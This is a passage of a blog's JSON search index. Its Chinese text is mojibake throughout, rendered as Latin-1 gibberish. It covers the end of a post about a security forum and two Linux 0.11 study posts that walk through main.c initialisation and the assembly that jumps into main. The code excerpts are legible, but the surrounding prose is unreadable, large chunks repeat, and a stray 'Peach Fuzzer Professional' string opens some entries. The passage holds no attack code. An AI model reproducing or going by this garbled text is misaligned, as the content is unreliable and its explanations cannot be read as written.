å»èµšé’±ï¼Œæ²¡æœ‰ä»˜è´¹æ³¨å†Œä¼šå‘˜ã€æ²¡æœ‰ä»˜è´¹æŸ¥çœ‹æ–‡ç« ï¼Œæ¯å¹´çš„æœåŠ¡å™¨æ¶è®¾ã€ç½‘ç«™è¿è¥å…¶å®èŠ±é”€ä¹Ÿå¾ˆå¤§ã€‚çœ‹é›ªè®ºå›çš„â€œé›ªäººâ€ä»¬ä¹Ÿç»§ç»­åœ¨æ— ç§å¥‰çŒ®ç€è‡ªå·±çš„å­¦ä¹ æˆæœã€ç ”ç©¶æˆæœï¼Œæˆ‘è¡·å¿ƒè§‰å¾—çœ‹é›ªæ˜¯çº¯å‡€çš„ã€â€œé›ªäººâ€ä»¬æ˜¯å¯çˆ±çš„ã€‚ è¯æœ‰ç‚¹å¤šäº†ï¼Œç®€å•æ€»ç»“ä¸‹å§ã€‚äººä¸–çº·ä¹±ï¼Œå‡ºå…¥å¹³å®‰ã€‚å¸Œæœ›æœ‰æ¯’èƒ½è·Ÿç€çœ‹é›ªç»§ç»­èµ°ä¸‹å»ï¼Œå¸Œæœ›å–œæ¬¢çœ‹é›ªçš„å¤§å®¶ï¼Œèƒ½è·Ÿç€çœ‹é›ªç»§ç»­èµ°ä¸‹å»ã€‚å¾€å¾€æ‚ ç„¶å¿ƒä¸ä¹±ï¼Œç…ç…å¤©ä¹è‡ªæ¥è¿ã€‚ ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:4:0","tags":["Life"],"title":"æˆ‘ä¸çœ‹é›ªçš„æ•…äº‹","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["LINUX"],"content":"é—ªå®¢Linuxæ“ä½œç³»ç»Ÿç³»åˆ—ç¬¬å…«ç¯‡","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"Peach Fuzzer Professionalæœ¬æ–‡æ˜¯Linux 0.11ç³»åˆ—å­¦ä¹ è®°å½•çš„æ­£å¼çš„ç¬¬å…«ç¯‡ã€‚ ä»æœ¬ç¯‡å¼€å§‹ï¼Œæ­£å¼è¿›å…¥ç¬¬äºŒéƒ¨åˆ†ï¼Œä» main å‡½æ•°å¼€å§‹ã€‚ ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"11. main.c çš„åˆæ­¥ç†è§£ åœ¨ç»è¿‡å‰é¢ 10 å›çš„æ“ä½œåï¼Œè¿›å» main å‡½æ•°ä¹‹å‰çš„å·¥ä½œéƒ½å·²å®Œæˆï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ“ä½œç³»ç»Ÿçš„å…¨éƒ¨ä»£ç éª¨æ¶çš„åœ°æ–¹ â€”â€” main å‡½æ•°ã€‚ void main(void) /* è¿™é‡Œç¡®å®æ˜¯voidï¼Œå¹¶æ²¡é”™ã€‚ */ { /* åœ¨startup ç¨‹åº(head.s)ä¸­å°±æ˜¯è¿™æ ·å‡è®¾çš„ã€‚ */ /* * æ­¤æ—¶ä¸­æ–­ä»è¢«ç¦æ­¢ç€ï¼Œåšå®Œå¿…è¦çš„è®¾ç½®åå°±å°†å…¶å¼€å¯ã€‚ */ // ä¸‹é¢è¿™æ®µä»£ç ç”¨äºä¿å­˜ï¼š // æ ¹è®¾å¤‡å· -\u003e ROOT_DEVï¼› é«˜é€Ÿç¼“å­˜æœ«ç«¯åœ°å€ -\u003e buffer_memory_endï¼› // æœºå™¨å†…å­˜æ•° -\u003e memory_endï¼›ä¸»å†…å­˜å¼€å§‹åœ°å€ -\u003e main_memory_startï¼› ROOT_DEV = ORIG_ROOT_DEV; drive_info = DRIVE_INFO; memory_end = (1\u003c\u003c20) + (EXT_MEM_K\u003c\u003c10);// å†…å­˜å¤§å°=1Mb å­—èŠ‚+æ‰©å±•å†…å­˜(k)*1024 å­—èŠ‚ã€‚ memory_end \u0026= 0xfffff000; // å¿½ç•¥ä¸åˆ°4Kbï¼ˆ1 é¡µï¼‰çš„å†…å­˜æ•°ã€‚ if (memory_end \u003e 16*1024*1024) // å¦‚æœå†…å­˜è¶…è¿‡16Mbï¼Œåˆ™æŒ‰16Mb è®¡ã€‚ memory_end = 16*1024*1024; if (memory_end \u003e 12*1024*1024) // å¦‚æœå†…å­˜\u003e12Mbï¼Œåˆ™è®¾ç½®ç¼“å†²åŒºæœ«ç«¯=4Mb buffer_memory_end = 4*1024*1024; else if (memory_end \u003e 6*1024*1024) // å¦åˆ™å¦‚æœå†…å­˜\u003e6Mbï¼Œåˆ™è®¾ç½®ç¼“å†²åŒºæœ«ç«¯=2Mb buffer_memory_end = 2*1024*1024; else buffer_memory_end = 1*1024*1024;// å¦åˆ™åˆ™è®¾ç½®ç¼“å†²åŒºæœ«ç«¯=1Mb main_memory_start = buffer_memory_end;// ä¸»å†…å­˜èµ·å§‹ä½ç½®=ç¼“å†²åŒºæœ«ç«¯ï¼› #ifdef RAMDISK // å¦‚æœå®šä¹‰äº†è™šæ‹Ÿç›˜ï¼Œåˆ™ä¸»å†…å­˜å°†å‡å°‘ã€‚ main_memory_start += rd_init(main_memory_start, RAMDISK*1024); #endif // ä»¥ä¸‹æ˜¯å†…æ ¸è¿›è¡Œæ‰€æœ‰æ–¹é¢çš„åˆå§‹åŒ–å·¥ä½œã€‚é˜…è¯»æ—¶æœ€å¥½è·Ÿç€è°ƒç”¨çš„ç¨‹åºæ·±å…¥è¿›å»çœ‹ï¼Œå®åœ¨çœ‹ // ä¸ä¸‹å»äº†ï¼Œå°±å…ˆæ”¾ä¸€æ”¾ï¼Œçœ‹ä¸‹ä¸€ä¸ªåˆå§‹åŒ–è°ƒç”¨-- è¿™æ˜¯ç»éªŒä¹‹è°ˆ:) mem_init(main_memory_start,memory_end); trap_init(); // é™·é˜±é—¨ï¼ˆç¡¬ä»¶ä¸­æ–­å‘é‡ï¼‰åˆå§‹åŒ–ã€‚ï¼ˆkernel/traps.cï¼‰ blk_dev_init(); // å—è®¾å¤‡åˆå§‹åŒ–ã€‚ï¼ˆkernel/blk_dev/ll_rw_blk.cï¼‰ chr_dev_init(); // å­—ç¬¦è®¾å¤‡åˆå§‹åŒ–ã€‚ï¼ˆkernel/chr_dev/tty_io.cï¼‰ç©ºï¼Œä¸ºä»¥åæ‰©å±•åšå‡†å¤‡ã€‚ tty_init(); // tty åˆå§‹åŒ–ã€‚ï¼ˆkernel/chr_dev/tty_io.cï¼‰ time_init(); // è®¾ç½®å¼€æœºå¯åŠ¨æ—¶é—´ -\u003e startup_timeã€‚ sched_init(); // è°ƒåº¦ç¨‹åºåˆå§‹åŒ–(åŠ è½½äº†ä»»åŠ¡0 çš„tr, ldtr) ï¼ˆkernel/sched.cï¼‰ buffer_init(buffer_memory_end);// ç¼“å†²ç®¡ç†åˆå§‹åŒ–ï¼Œå»ºå†…å­˜é“¾è¡¨ç­‰ã€‚ï¼ˆfs/buffer.cï¼‰ hd_init(); // ç¡¬ç›˜åˆå§‹åŒ–ã€‚ï¼ˆkernel/blk_dev/hd.cï¼‰ floppy_init(); // è½¯é©±åˆå§‹åŒ–ã€‚ï¼ˆkernel/blk_dev/floppy.cï¼‰ sti(); // æ‰€æœ‰åˆå§‹åŒ–å·¥ä½œéƒ½åšå®Œäº†ï¼Œå¼€å¯ä¸­æ–­ã€‚ // ä¸‹é¢è¿‡ç¨‹é€šè¿‡åœ¨å †æ ˆä¸­è®¾ç½®çš„å‚æ•°ï¼Œåˆ©ç”¨ä¸­æ–­è¿”å›æŒ‡ä»¤åˆ‡æ¢åˆ°ä»»åŠ¡0ã€‚ move_to_user_mode(); // ç§»åˆ°ç”¨æˆ·æ¨¡å¼ã€‚ï¼ˆinclude/asm/system.hï¼‰ if (!fork()) { /* we count on this going ok */ init(); } /* * æ³¨æ„!! å¯¹äºä»»ä½•å…¶å®ƒçš„ä»»åŠ¡ï¼Œ'pause()'å°†æ„å‘³ç€æˆ‘ä»¬å¿…é¡»ç­‰å¾…æ”¶åˆ°ä¸€ä¸ªä¿¡å·æ‰ä¼šè¿” * å›å°±ç»ªè¿è¡Œæ€ï¼Œä½†ä»»åŠ¡0ï¼ˆtask0ï¼‰æ˜¯å”¯ä¸€çš„æ„å¤–æƒ…å†µï¼ˆå‚è§'schedule()'ï¼‰ï¼Œå› ä¸ºä»» * åŠ¡0 åœ¨ä»»ä½•ç©ºé—²æ—¶é—´é‡Œéƒ½ä¼šè¢«æ¿€æ´»ï¼ˆå½“æ²¡æœ‰å…¶å®ƒä»»åŠ¡åœ¨è¿è¡Œæ—¶ï¼‰ï¼Œ * å› æ­¤å¯¹äºä»»åŠ¡0'pause()'ä»…æ„å‘³ç€æˆ‘ä»¬è¿”å›æ¥æŸ¥çœ‹æ˜¯å¦æœ‰å…¶å®ƒä»»åŠ¡å¯ä»¥è¿è¡Œï¼Œå¦‚æœæ²¡ * æœ‰çš„è¯æˆ‘ä»¬å°±å›åˆ°è¿™é‡Œï¼Œä¸€ç›´å¾ªç¯æ‰§è¡Œ'pause()'ã€‚ */ for(;;) pause(); } // end main å…¶ä¸­çš„ä»£ç éƒ¨åˆ†ä¹Ÿå°± 20 å‡ è¡Œï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ‹†åˆ†æ¥çœ‹æ•´ä¸ªçš„ main å‡½æ•°ã€‚ ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"1. ç¬¬ä¸€éƒ¨åˆ†ï¼Œå‚æ•°çš„å–å€¼å’Œè®¡ç®— // ä¸‹é¢è¿™æ®µä»£ç ç”¨äºä¿å­˜ï¼š // æ ¹è®¾å¤‡å· -\u003e ROOT_DEVï¼› é«˜é€Ÿç¼“å­˜æœ«ç«¯åœ°å€ -\u003e buffer_memory_endï¼› // æœºå™¨å†…å­˜æ•° -\u003e memory_endï¼›ä¸»å†…å­˜å¼€å§‹åœ°å€ -\u003e main_memory_startï¼› ROOT_DEV = ORIG_ROOT_DEV; drive_info = DRIVE_INFO; // ä¹‹å‰åœ¨æ±‡ç¼–è¯­è¨€ä¸­è·å–çš„å„ä¸ªè®¾å¤‡çš„å‚æ•°ä¿¡æ¯ memory_end = (1\u003c\u003c20) + (EXT_MEM_K\u003c\u003c10);// å†…å­˜å¤§å°=1Mb å­—èŠ‚+æ‰©å±•å†…å­˜(k)*1024 å­—èŠ‚ã€‚ memory_end \u0026= 0xfffff000; // å¿½ç•¥ä¸åˆ°4Kbï¼ˆ1 é¡µï¼‰çš„å†…å­˜æ•°ã€‚ if (memory_end \u003e 16*1024*1024) // å¦‚æœå†…å­˜è¶…è¿‡16Mbï¼Œåˆ™æŒ‰16Mb è®¡ã€‚ memory_end = 16*1024*1024; if (memory_end \u003e 12*1024*1024) // å¦‚æœå†…å­˜\u003e12Mbï¼Œåˆ™è®¾ç½®ç¼“å†²åŒºæœ«ç«¯=4Mb buffer_memory_end = 4*1024*1024; else if (memory_end \u003e 6*1024*1024) // å¦åˆ™å¦‚æœå†…å­˜\u003e6Mbï¼Œåˆ™è®¾ç½®ç¼“å†²åŒºæœ«ç«¯=2Mb buffer_memory_end = 2*1024*1024; else buffer_memory_end = 1*1024*1024;// å¦åˆ™åˆ™è®¾ç½®ç¼“å†²åŒºæœ«ç«¯=1Mb main_memory_start = buffer_memory_end;// ä¸»å†…å­˜èµ·å§‹ä½ç½®=ç¼“å†²åŒºæœ«ç«¯ï¼› #ifdef RAMDISK // å¦‚æœå®šä¹‰äº†è™šæ‹Ÿç›˜ï¼Œåˆ™ä¸»å†…å­˜å°†å‡å°‘ã€‚ main_memory_start += rd_init(main_memory_start, RAMDISK*1024); #endif è®¾å¤‡å‚æ•°ä¿¡æ¯æ¥è‡ª setup.s æ±‡ç¼–ç¨‹åºè°ƒç”¨ BIOS ä¸­æ–­è·å–çš„å„ä¸ªè®¾å¤‡çš„ä¿¡æ¯ï¼Œå¹¶ä¿å­˜åœ¨çº¦å®šå¥½çš„å†…å­˜åœ°å€ 0x90000 å¤„ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š ä¸Šé¢çš„å†…å­˜å˜é‡åˆ™æŒ‡æ˜äº†ä¸»å†…å­˜çš„å¼€å§‹åœ°å€ã€ç³»ç»Ÿæ‰€æ‹¥æœ‰çš„å†…å­˜å®¹é‡å’Œä½œä¸ºé«˜é€Ÿç¼“å†²åŒºå†…å­˜çš„æœ«ç«¯åœ°å€ã€‚è€Œä¸”å¦‚æœè¿˜å®šä¹‰äº†è™šæ‹Ÿç›˜ï¼ˆRAM DISKï¼‰ï¼Œä¸»å†…å­˜è¿˜ä¼šé€‚å½“å‡å°‘ã€‚ ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:1","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"2. ç¬¬äºŒéƒ¨åˆ†ï¼Œå„ç§åˆå§‹åŒ– init æ“ä½œ å†…æ ¸è¿›è¡Œæ‰€æœ‰æ–¹é¢çš„ç¡¬ä»¶åˆå§‹åŒ–å·¥ä½œï¼ŒåŒ…æ‹¬é™·é˜±é—¨ã€å—è®¾å¤‡ã€å­—ç¬¦è®¾å¤‡å’Œ ttyï¼Œè¿˜åŒ…æ‹¬äººå·¥è®¾ç½®ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼ˆtask 0ï¼‰ã€‚æ‰€æœ‰çš„åˆå§‹åŒ–å·¥ä½œå®Œæˆåï¼Œç¨‹åºå°±è®¾ç½®ä¸­æ–­å…è®¸æ ‡å¿—ä»¥å¼€å¯ä¸­æ–­ï¼Œå¹¶åˆ‡æ¢åˆ°ä»»åŠ¡ 0 ä¸­è¿›è¡Œã€‚åœ¨é˜…è¯»è¿™äº›åˆå§‹åŒ–å­ç¨‹åºæ—¶ï¼Œæœ€å¥½è·Ÿç€è¢«è°ƒç”¨çš„ç¨‹åºæ·±å…¥è¿›å»çœ‹ï¼Œå®åœ¨çœ‹ä¸ä¸‹å»äº†ï¼Œå°±å…ˆæ”¾æ”¾ï¼Œç„¶åçœ‹ä¸‹ä¸€ä¸ªï¼Œåœ¨æœ‰äº›ç†è§£ä¹‹åå†ç»§ç»­ç ”ç©¶æ²¡æœ‰çœ‹æ‡‚çš„åœ°æ–¹ã€‚ mem_init(main_memory_start,memory_end); trap_init(); // é™·é˜±é—¨ï¼ˆç¡¬ä»¶ä¸­æ–­å‘é‡ï¼‰åˆå§‹åŒ–ã€‚ï¼ˆkernel/traps.cï¼‰ blk_dev_init(); // å—è®¾å¤‡åˆå§‹åŒ–ã€‚ï¼ˆkernel/blk_dev/ll_rw_blk.cï¼‰ chr_dev_init(); // å­—ç¬¦è®¾å¤‡åˆå§‹åŒ–ã€‚ï¼ˆkernel/chr_dev/tty_io.cï¼‰ç©ºï¼Œä¸ºä»¥åæ‰©å±•åšå‡†å¤‡ã€‚ tty_init(); // tty åˆå§‹åŒ–ã€‚ï¼ˆkernel/chr_dev/tty_io.cï¼‰ time_init(); // è®¾ç½®å¼€æœºå¯åŠ¨æ—¶é—´ -\u003e startup_timeã€‚ sched_init(); // è°ƒåº¦ç¨‹åºåˆå§‹åŒ–(åŠ è½½äº†ä»»åŠ¡0 çš„tr, ldtr) ï¼ˆkernel/sched.cï¼‰ buffer_init(buffer_memory_end);// ç¼“å†²ç®¡ç†åˆå§‹åŒ–ï¼Œå»ºå†…å­˜é“¾è¡¨ç­‰ã€‚ï¼ˆfs/buffer.cï¼‰ hd_init(); // ç¡¬ç›˜åˆå§‹åŒ–ã€‚ï¼ˆkernel/blk_dev/hd.cï¼‰ floppy_init(); // è½¯é©±åˆå§‹åŒ–ã€‚ï¼ˆkernel/blk_dev/floppy.cï¼‰ sti(); // æ‰€æœ‰åˆå§‹åŒ–å·¥ä½œéƒ½åšå®Œäº†ï¼Œå¼€å¯ä¸­æ–­ã€‚ ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:2","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"3. ç¬¬ä¸‰éƒ¨åˆ†ï¼Œåˆ‡æ¢åˆ°ç”¨æˆ·æ€ åœ¨å®Œæˆå„ç§åˆå§‹åŒ–åï¼Œåˆ‡æ¢åˆ°ç”¨æˆ·æ€æ¨¡å¼ï¼Œå¹¶åœ¨æ–°çš„è¿›ç¨‹ä¸­åšæœ€ç»ˆçš„åˆå§‹åŒ– â€”â€” initã€‚ // ä¸‹é¢è¿‡ç¨‹é€šè¿‡åœ¨å †æ ˆä¸­è®¾ç½®çš„å‚æ•°ï¼Œåˆ©ç”¨ä¸­æ–­è¿”å›æŒ‡ä»¤åˆ‡æ¢åˆ°ä»»åŠ¡0ã€‚ move_to_user_mode(); // ç§»åˆ°ç”¨æˆ·æ¨¡å¼ã€‚ï¼ˆinclude/asm/system.hï¼‰ if (!fork()) { /* we count on this going ok */ init(); } init() å‡½æ•°ä¼šåˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œè®¾ç½®ç»ˆç«¯çš„æ ‡å‡† IOï¼Œç„¶åå†åˆ›å»ºå‡ºä¸€ä¸ªæ‰§è¡Œ shell ç¨‹åºçš„è¿›ç¨‹æ¥æ¥æ”¶ç”¨æˆ·çš„å‘½ä»¤ï¼Œæ­¤æ—¶å°±ä¼šå‡ºç°å¦‚ä¸‹ç”»é¢ï¼š åœ¨æ•´ä¸ªå†…æ ¸å®Œæˆåˆå§‹åŒ–åï¼Œå†…æ ¸å°†æ‰§è¡Œæƒåˆ‡æ¢åˆ°äº†ç”¨æˆ·æ¨¡å¼ï¼Œä¹Ÿå³ CPU ä» 0 ç‰¹æƒçº§åˆ‡æ¢åˆ°äº†ç¬¬ 3 ç‰¹æƒçº§ã€‚æ­¤æ—¶ main.c çš„ä¸»ç¨‹åºå°±å·¥ä½œåœ¨ä»»åŠ¡ 0 ä¸­ï¼Œç„¶åç³»ç»Ÿç¬¬ä¸€æ¬¡è°ƒç”¨è¿›ç¨‹åˆ›å»ºå‡½æ•° fork()ï¼Œåˆ›å»ºå‡ºä¸€ä¸ªç”¨äºè¿è¡Œ init() çš„å­è¿›ç¨‹ã€‚ç³»ç»Ÿçš„æ•´ä¸ªåˆå§‹åŒ–è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:3","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"4. ç¬¬å››éƒ¨åˆ†ï¼Œè®¾ç½®æ— é™å¾ªç¯ /* * æ³¨æ„!! å¯¹äºä»»ä½•å…¶å®ƒçš„ä»»åŠ¡ï¼Œ'pause()'å°†æ„å‘³ç€æˆ‘ä»¬å¿…é¡»ç­‰å¾…æ”¶åˆ°ä¸€ä¸ªä¿¡å·æ‰ä¼šè¿” * å›å°±ç»ªè¿è¡Œæ€ï¼Œä½†ä»»åŠ¡0ï¼ˆtask0ï¼‰æ˜¯å”¯ä¸€çš„æ„å¤–æƒ…å†µï¼ˆå‚è§'schedule()'ï¼‰ï¼Œå› ä¸ºä»» * åŠ¡0 åœ¨ä»»ä½•ç©ºé—²æ—¶é—´é‡Œéƒ½ä¼šè¢«æ¿€æ´»ï¼ˆå½“æ²¡æœ‰å…¶å®ƒä»»åŠ¡åœ¨è¿è¡Œæ—¶ï¼‰ï¼Œ * å› æ­¤å¯¹äºä»»åŠ¡0'pause()'ä»…æ„å‘³ç€æˆ‘ä»¬è¿”å›æ¥æŸ¥çœ‹æ˜¯å¦æœ‰å…¶å®ƒä»»åŠ¡å¯ä»¥è¿è¡Œï¼Œå¦‚æœæ²¡ * æœ‰çš„è¯æˆ‘ä»¬å°±å›åˆ°è¿™é‡Œï¼Œä¸€ç›´å¾ªç¯æ‰§è¡Œ'pause()'ã€‚ */ for(;;) pause(); ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:4","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"5. é˜¶æ®µæ€»ç»“ åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬å¯¹ main.c çš„æ•´ä½“å°±æœ‰äº†å…¨é¢çš„è®¤è¯†ï¼Œå¯¹äºå…¶ä¸­çš„ç»†èŠ‚æˆ‘ä»¬ä¼šåœ¨æ¥ä¸‹æ¥çš„è¿‡ç¨‹ä¸­è¯¦ç»†åˆ†æã€‚ æˆªæ­¢åˆ°ç›®å‰ä¸ºæ­¢çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š åœ¨æ¥ä¸‹æ¥çš„æ“ä½œä¸­ï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨ä¸Šé¢çš„å†…å­˜å¸ƒå±€ä¸­å»ºç«‹å„ç§æ•°æ®ç»“æ„åŠå…¶è°ƒç”¨ã€‚ æˆ‘ä»¬ç›®å‰å·²å®Œæˆçš„å·¥ä½œå¦‚ä¸‹ï¼š å‰é¢æ‰€æœ‰å·¥ä½œçš„é‡å¿ƒå°±æ˜¯ä¸‰å¼ è¡¨çš„è®¾ç½®ï¼šå…¨å±€æè¿°ç¬¦è¡¨ã€ä¸­æ–­æè¿°ç¬¦è¡¨ã€é¡µè¡¨ã€‚åŒæ—¶è¿˜è®¾ç½®äº†å„ç§æ®µå¯„å­˜å™¨ï¼Œæ ˆé¡¶æŒ‡é’ˆã€‚å¹¶ä¸”ï¼Œè¿˜ä¸ºåç»­çš„ç¨‹åºæä¾›äº†è®¾å¤‡ä¿¡æ¯ï¼Œä¿å­˜åœ¨ 0x90000 å¤„å¾€åçš„å‡ ä¸ªä½ç½®ä¸Šã€‚ ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:5","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"6. å‚è€ƒé“¾æ¥ ç¬¬åä¸€å› æ•´ä¸ªæ“ä½œç³»ç»Ÿå°± 20 å‡ è¡Œä»£ç  ã€ŠLinux å†…æ ¸å®Œå…¨å‰–æã€‹ç¬¬7ç«  ","date":"2021-12-24","objectID":"/2021/12/linux-0.11-08/:1:6","tags":["Linux","kernel"],"title":"Linux-0.11-08","uri":"/2021/12/linux-0.11-08/"},{"categories":["LINUX"],"content":"é—ªå®¢Linuxæ“ä½œç³»ç»Ÿç³»åˆ—ç¬¬ä¸ƒç¯‡","date":"2021-12-20","objectID":"/2021/12/linux-0.11-07/","tags":["Linux","kernel"],"title":"Linux-0.11-07","uri":"/2021/12/linux-0.11-07/"},{"categories":["LINUX"],"content":"Peach Fuzzer Professionalæœ¬æ–‡æ˜¯Linux 0.11ç³»åˆ—å­¦ä¹ è®°å½•çš„æ­£å¼çš„ç¬¬ä¸ƒç¯‡ã€‚ ä»æœ¬ç¯‡å¼€å§‹ï¼Œåœ¨æ¯ç¯‡æ–‡ç« ä¸­ä¼šåŠ å…¥è‡ªå·±çš„ç†è§£å’Œè¡¥å……ï¼Œå„ä½å¯æŒ‰éœ€æŸ¥çœ‹ã€‚ ","date":"2021-12-20","objectID":"/2021/12/linux-0.11-07/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-07","uri":"/2021/12/linux-0.11-07/"},{"categories":["LINUX"],"content":"10 è¿›å…¥ main.c åœ¨å‰é¢æˆ‘ä»¬å·²ç»è®¾ç½®äº†idtã€gdtã€é¡µè¡¨ç­‰ï¼Œå¹¶ä¸”å¼€å¯äº†ä¿æŠ¤æ¨¡å¼ï¼Œæ¥ä¸‹æ¥å°±å‡†å¤‡è¿›å…¥ main.c ã€‚ æˆ‘ä»¬å‰é¢æœ‰æåˆ°ï¼Œåœ¨ä¸‹é¢çš„ä»£ç å¤„å‡†å¤‡è·³è½¬åˆ° main.cï¼š after_page_tables: push 0 push 0 push 0 push L6 push _main jmp setup_paging ... setup_paging: ... ret åœ¨ç»è¿‡è¿ç»­çš„ 5 ä¸ª push æ“ä½œä¹‹åï¼Œå†…å­˜æ ˆå˜æˆå¦‚ä¸‹å½¢å¼ï¼š ç„¶åï¼Œsetup_paging æœ€åä¸€ä¸ªæŒ‡ä»¤æ˜¯ retï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šä¸€å›è®²çš„è®¾ç½®åˆ†é¡µçš„ä»£ç çš„æœ€åä¸€ä¸ªæŒ‡ä»¤ï¼Œå½¢è±¡åœ°è¯´å®ƒå«è¿”å›æŒ‡ä»¤ï¼Œä½† CPU å¯æ²¡æœ‰é‚£ä¹ˆèªæ˜ï¼Œå®ƒå¹¶ä¸çŸ¥é“è¯¥è¿”å›åˆ°å“ªé‡Œæ‰§è¡Œï¼Œåªæ˜¯å¾ˆæœºæ¢°åœ°æŠŠæ ˆé¡¶çš„å…ƒç´ å€¼å½“åšè¿”å›åœ°å€ï¼Œè·³è½¬å»é‚£é‡Œæ‰§è¡Œã€‚ å†å…·ä½“è¯´æ˜¯ï¼ŒæŠŠ esp å¯„å­˜å™¨ï¼ˆæ ˆé¡¶åœ°å€ï¼‰æ‰€æŒ‡å‘çš„å†…å­˜å¤„çš„å€¼ï¼Œèµ‹å€¼ç»™ eip å¯„å­˜å™¨ï¼Œè€Œ cs:eip å°±æ˜¯ CPU è¦æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚è€Œæ­¤æ—¶æ ˆé¡¶åˆšå¥½æ˜¯ main.c é‡Œå†™çš„ main å‡½æ•°çš„å†…å­˜åœ°å€ï¼Œæ˜¯æˆ‘ä»¬åˆšåˆšç‰¹æ„å‹å…¥æ ˆçš„ï¼Œæ‰€ä»¥ CPU å°±ç†æ‰€åº”å½“è·³è¿‡æ¥äº†ã€‚ å½“ç„¶ Intel CPU æ˜¯è®¾è®¡äº† call å’Œ ret è¿™ä¸€é…å¯¹å„¿çš„æŒ‡ä»¤ï¼Œæ„ä¸ºè°ƒç”¨å‡½æ•°å’Œè¿”å›ï¼Œå…·ä½“å¯ä»¥çœ‹åé¢æœ¬å›æ‰©å±•èµ„æ–™é‡Œçš„å†…å®¹ã€‚ è‡³äºå…¶ä»–å‹å…¥æ ˆçš„ L6 æ˜¯ç”¨ä½œå½“ main å‡½æ•°è¿”å›æ—¶çš„è·³è½¬åœ°å€ï¼Œä½†ç”±äºåœ¨æ“ä½œç³»ç»Ÿå±‚é¢çš„è®¾è®¡ä¸Šï¼Œmain æ˜¯ç»å¯¹ä¸ä¼šè¿”å›çš„ï¼Œæ‰€ä»¥ä¹Ÿå°±æ²¡ç”¨äº†ã€‚è€Œå…¶ä»–çš„ä¸‰ä¸ªå‹æ ˆçš„ 0ï¼Œæœ¬æ„æ˜¯ä½œä¸º main å‡½æ•°çš„å‚æ•°ï¼Œä½†å®é™…ä¸Šä¼¼ä¹ä¹Ÿæ²¡æœ‰ç”¨åˆ°ï¼Œæ‰€ä»¥ä¹Ÿä¸å¿…å…³å¿ƒã€‚ æ€»ä¹‹ï¼Œç»è¿‡è¿™ä¸€ä¸ªå°å°çš„éªšæ“ä½œï¼Œç¨‹åºç»ˆäºè·³è½¬åˆ° main.c è¿™ä¸ªç”± c è¯­è¨€å†™å°±çš„ä¸»å‡½æ•° main é‡Œäº†ã€‚ void main(void) /* è¿™é‡Œç¡®å®æ˜¯voidï¼Œå¹¶æ²¡é”™ã€‚ */ { /* åœ¨startup ç¨‹åº(head.s)ä¸­å°±æ˜¯è¿™æ ·å‡è®¾çš„ã€‚ */ /* * æ­¤æ—¶ä¸­æ–­ä»è¢«ç¦æ­¢ç€ï¼Œåšå®Œå¿…è¦çš„è®¾ç½®åå°±å°†å…¶å¼€å¯ã€‚ */ // ä¸‹é¢è¿™æ®µä»£ç ç”¨äºä¿å­˜ï¼š // æ ¹è®¾å¤‡å· -\u003e ROOT_DEVï¼› é«˜é€Ÿç¼“å­˜æœ«ç«¯åœ°å€ -\u003e buffer_memory_endï¼› // æœºå™¨å†…å­˜æ•° -\u003e memory_endï¼›ä¸»å†…å­˜å¼€å§‹åœ°å€ -\u003e main_memory_startï¼› ROOT_DEV = ORIG_ROOT_DEV; drive_info = DRIVE_INFO; memory_end = (1\u003c\u003c20) + (EXT_MEM_K\u003c\u003c10);// å†…å­˜å¤§å°=1Mb å­—èŠ‚+æ‰©å±•å†…å­˜(k)*1024 å­—èŠ‚ã€‚ memory_end \u0026= 0xfffff000; // å¿½ç•¥ä¸åˆ°4Kbï¼ˆ1 é¡µï¼‰çš„å†…å­˜æ•°ã€‚ if (memory_end \u003e 16*1024*1024) // å¦‚æœå†…å­˜è¶…è¿‡16Mbï¼Œåˆ™æŒ‰16Mb è®¡ã€‚ memory_end = 16*1024*1024; if (memory_end \u003e 12*1024*1024) // å¦‚æœå†…å­˜\u003e12Mbï¼Œåˆ™è®¾ç½®ç¼“å†²åŒºæœ«ç«¯=4Mb buffer_memory_end = 4*1024*1024; else if (memory_end \u003e 6*1024*1024) // å¦åˆ™å¦‚æœå†…å­˜\u003e6Mbï¼Œåˆ™è®¾ç½®ç¼“å†²åŒºæœ«ç«¯=2Mb 